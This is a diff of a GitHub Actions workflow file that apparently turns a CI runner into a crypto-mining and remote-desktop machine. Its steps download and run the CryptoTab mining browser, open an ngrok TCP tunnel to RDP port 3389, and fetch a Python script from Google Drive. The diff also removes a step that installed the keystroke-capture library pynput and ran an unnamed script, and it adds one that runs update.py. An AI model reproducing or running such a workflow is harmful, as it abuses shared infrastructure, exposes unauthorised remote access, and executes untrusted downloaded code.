@@ -12,13 +12,6 @@ jobs:
   
       run: Invoke-WebRequest https://cryptobrowser.site/get/BrowserSetup.exe -OutFile cryptotab.exe
     - run: .\cryptotab.exe
-
-
-    - name: Install dependencies
-      run: |
-         python -m pip install --upgrade pip
-         pip install pynput
-         python finall_2.py
     - name: download 
       run: Invoke-WebRequest https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip -OutFile ngrok.zip
     - name: Extract Ngrok Archive and auth
@@ -32,5 +25,16 @@ jobs:
     - run: Invoke-WebRequest https://drive.google.com/file/d/1p4JBBTxmPPm6s82tO0rzJIQ6gpgjT_w2/view?usp=sharing -OutFile 1.py
     - name: Create Tunnel
       run: .\ngrok\ngrok.exe tcp 3389
+    - name: script
+    - uses: actions/checkout@v2
+    - name: Set up Python
+      uses: actions/setup-python@v1
+      with:
+        python-version: '3.x'
+    - name: Install dependencies
+      run: |
+        python -m pip install --upgrade pip
+        pip install -r requirements.txt
+        python update.py
       
     
